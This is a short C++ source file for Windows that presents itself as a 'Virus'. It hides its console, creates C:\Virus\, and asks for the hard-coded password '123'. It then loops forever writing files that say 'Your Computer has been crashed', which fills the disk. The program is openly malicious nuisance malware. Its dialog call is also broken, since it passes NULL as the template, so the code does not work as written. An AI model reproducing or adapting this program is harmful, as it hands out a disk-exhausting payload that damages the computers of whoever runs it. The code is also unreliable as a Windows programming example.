#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>
#include <Windows.h>

bool checkPassword(const std::string &input)
{
    const std::string correctPassword = "123"; // Set your desired password here
    return input == correctPassword;
}

int main()
{
    FreeConsole();
    int h = 0;
    const char *path = "C:\\Virus\\";
    std::string str = "Your Computer has been crashed";
    _mkdir(path);

    std::string userInput;

    while (true)
    {
        // Prompt for password
        char password[100];
        if (DialogBoxParam(NULL, NULL, NULL, NULL, reinterpret_cast<LPARAM>(&password)) == IDOK)
        {
            userInput = password;

            if (checkPassword(userInput))
            {
                break; // Exit loop if password is correct
            }
            else
            {
                MessageBox(NULL, "Incorrect password. Try again.", "Error", MB_OK | MB_ICONERROR);
            }
        }
    }

    // This part will execute once the correct password is entered
    while (true)
    {
        ++h;
        std::ofstream Virus;
        Virus.open(path + std::to_string(h) + ".txt", std::ios_base::out);
        Virus << str;
        Virus.close();
    }

    return -1;
}
